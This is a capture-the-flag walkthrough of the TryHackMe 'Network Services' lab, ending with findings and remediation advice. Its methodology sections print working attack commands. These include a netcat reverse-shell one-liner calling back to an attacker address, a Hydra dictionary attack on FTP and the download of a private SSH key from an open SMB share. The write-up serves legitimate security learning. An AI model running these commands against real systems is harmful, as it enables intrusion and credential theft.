# TryHackMe — Network Services

**Difficulty:** Easy · **Category:** Network / Linux · **Date:** November 2026
**Author:** [Jbali Aloui](https://github.com/aloui-sec)

> Walkthrough of the *Network Services* room. Credentials, flags and exact target
> addresses are redacted or replaced with placeholders — the value of this write-up
> is the methodology, not the answers.

---

## 1. Scope & Objective

An internal Linux host running three legacy network services: **SMB**, **Telnet**
(on a non-standard port) and **FTP**. The objective was to enumerate each service,
identify a weak configuration in each, and escalate from anonymous read access to
remote command execution.

This is a realistic scenario: careless service configuration is still one of the
most common root causes in real engagements.

---

## 2. Reconnaissance

A full TCP port scan is mandatory here — the interesting services are **not** on
their default ports.

```bash
nmap -p- -T4 <TARGET>
nmap -sV -sC -p 22,139,445,8012,21 <TARGET>
```

| Port | Service | Version / Note |
|------|---------|----------------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 139  | SMB     | Samba smbd 4 |
| 445  | SMB     | Samba smbd 4 |
| 8012 | unknown | **Telnet assigned to a non-standard port** |
| 21   | FTP     | vsftpd — **anonymous login enabled** |

**Key lesson:** without `-p-`, port 8012 never appears. A default `nmap` scan
(top 1000 ports) returns **zero open ports** on this box. Enumeration depth is
directly proportional to how much of the target you can actually see.

---

## 3. SMB Enumeration

```bash
enum4linux -a <TARGET>
smbclient -L //<TARGET>/ -N
```

| Question | Result |
|----------|--------|
| Workgroup | `WORKGROUP` |
| NetBIOS / machine name | `POLOSMB` |
| OS version | `6.1` |
| Shares | `netlogon`, `profiles`, `print$`, `IPC$` |

Four shares are listed, but three are default Samba infrastructure
(`netlogon`, `print$`, `IPC$`). Only **`profiles`** — described as *"Users
profiles"* — is unusual: it exposes user home directories.

The enumeration question to ask is never *"which share looks strange?"* but
**"which share contains human data?"**

### 3.1 Exposed home directory

```bash
smbclient //<TARGET>/profiles -N
```

```
.cache  .profile  .sudo_as_admin_successful  .bash_logout
.bashrc  .viminfo  .gnupg  .ssh
"Working From Home Information.txt"
```

A document sitting next to an SSH directory is never a coincidence. Reading it
revealed an internal onboarding letter naming the account holder, confirming that
SSH access had been provisioned, and leaking an internal IT contact address.

The `.ssh` directory was then listed and the private key downloaded:

```bash
smbclient //<TARGET>/profiles -N -c 'cd .ssh; ls'
smbclient //<TARGET>/profiles -N -c 'cd .ssh; get id_rsa'
chmod 600 id_rsa
```

---

## 4. The SSH Key — a Worthwhile Dead End

Worth documenting honestly, because the reasoning matters more than the outcome.

The key was genuinely valid:

```bash
file id_rsa                 # PEM RSA private key, no CRLF, 1679 bytes, mode 600
ssh-keygen -y -f id_rsa     # emits a well-formed ssh-rsa public key
```

But authentication still fell back to a password prompt:

```bash
ssh -o BatchMode=yes -i id_rsa john@<TARGET>
```

**Why:** the corresponding `authorized_keys` file was **0 bytes**. A valid
private key proves nothing if the server does not trust the matching public key.
The key was real; it was simply never authorised.

Two further paths were tested and correctly ruled out:

| Attempt | Result | Conclusion |
|---------|--------|------------|
| `put` a file into `profiles` to inject a key | `NT_STATUS_ACCESS_DENIED` | Share is read-only — key injection impossible |
| `get .ssh/authorized_keys` / `.viminfo` | `NT_STATUS_ACCESS_DENIED` | Hidden files on the share are not retrievable, while `id_rsa` was |

This is where most beginners lose an hour. The right move is to **stop
re-testing the key** and look for a password elsewhere.

> One useful trick when debugging key auth: `-o BatchMode=yes` suppresses the
> interactive prompt and prints the real authentication error instead, so you can
> stop guessing whether the key or the server is at fault.

---

## 5. Telnet on a Non-Standard Port

Port 8012 banner:

```bash
nmap -p8012 -sV -Pn <TARGET>
# => banner identifies a custom backdoor ("SKIDY'S BACKDOOR")
```

Connecting to it presented an interactive menu with a small command interface:

```bash
telnet <TARGET> 8012
.HELP
```

The menu exposed a command-runner that executes operating-system commands. That
is remote code execution by design.

### 5.1 Reverse shell

A raw payload was generated and executed through the backdoor:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<VPN_IP> lport=4444 R

# listener on the attacker machine
nc -lvnp 4444
```

```
mkfifo /tmp/<tmpfile>; nc <VPN_IP> 4444 0</tmp/<tmpfile> | /bin/sh >/tmp/<tmpfile> 2>&1; rm /tmp/<tmpfile>
```

Executed through the backdoor's command interface it returned a shell to the
listener.

**Common mistake:** `lhost` is the **attacker's** address, not the target's. The
target is the one calling back.

**Note on tooling drift:** the room's suggested packet filter syntax
(`ip proto \icmp`) is rejected by modern libpcap. The current equivalent is
`tcpdump -i tun0 icmp`. When a documented command fails and the typing is
verified, suspect the tool version — not yourself.

---

## 6. FTP

### 6.1 Anonymous login

```bash
ftp <TARGET>
# Name: anonymous
# Password: (empty)
```

Anonymous access was enabled, exposing a readable file whose contents supplied a
valid username for the system.

### 6.2 Password brute force

Weak and default passwords are the second-most common configuration flaw in
legacy services. Hydra was used against the known username:

```bash
hydra -t 8 -l <USERNAME> -P /usr/share/wordlists/rockyou.txt -V <TARGET> ftp
```

The account reused a password present in the standard wordlist. Authenticating as
that user over FTP granted access to a file that had been readable only to them.

---

## 7. Findings

| # | Finding | Severity |
|---|---------|----------|
| 1 | SMB share `profiles` exposes every user home directory, including **private SSH keys** | Critical |
| 2 | Private SSH key stored on a network share instead of in the user's protected home | High |
| 3 | Telnet backdoor on port 8012 allowing unauthenticated command execution (RCE) | Critical |
| 4 | FTP **anonymous login** enabled, exposing internal files | High |
| 5 | FTP account protected by a **dictionary password** | High |
| 6 | Internal onboarding letter stored in a shared home directory, leaking a username and an internal contact address | Medium |
| 7 | Legacy plaintext protocols (Telnet, FTP) in use on an internet-reachable host | High |
| 8 | Shares and services discoverable only via full port scan, but not otherwise restricted | Info |

---

## 8. Remediation

1. **Remove Telnet entirely.** Replace with SSH. There is no legitimate reason to
   expose Telnet, on port 23 or anywhere else — the banner of the service on 8012
   was an unauthenticated command interface.
2. **Disable anonymous FTP access.** Enforce authenticated, encrypted transport
   (`SFTP` or `FTPS`) and restrict write scope to a dedicated directory.
3. **Rotate every credential exposed in this assessment** — the private key and
   the FTP password must both be treated as compromised.
4. **Remove user home directories from SMB share paths.** Samba should never
   publish home directories wholesale; scope shares to explicit subdirectories
   with per-share ACLs, and deny access to dot-directories on principle.
5. **Enforce a password policy backed by rate limiting and lockout.** A fast
   dictionary attack against FTP succeeded because nothing throttled it.
6. **Keep onboarding and internal documentation off file shares.** Credentials,
   usernames and internal contacts in a plaintext document turn a medium-severity
   misconfiguration into full compromise.

---

## 9. Lessons

1. **Full port scans are not optional.** The decisive service was invisible to a
   default scan.
2. **A valid credential is not an authorised credential.** Prove access, don't
   assume it.
3. **Banners leak names.** Service banners, error messages, share descriptions and
   stray documents are the material usernames are made of.
4. **Enumeration is most of the work.** Every step here began with information
   gathered in a previous step — never with a tool.
5. **Plaintext is the vulnerability.** Telnet and FTP are not "old" — they are
   intercepted credentials waiting to happen.
6. **Read-only shares are still findings.** The inability to write was not a dead
   end; it was a data-confidentiality issue of its own.
7. **Stop testing what is already proven.** Two independent signals said the key
   was unauthorised; continuing to test it was the waste.

---

## 10. References

- TryHackMe — [Network Services](https://tryhackme.com/room/networkservices)
- Exploit-DB #20745 — `in.ftpd` CWD disclosure (legacy user enumeration)
- Nmap / Samba / Hydra / tcpdump documentation

---

<sub>Published as part of a public learning log. All testing was performed against
an authorised lab environment.</sub>
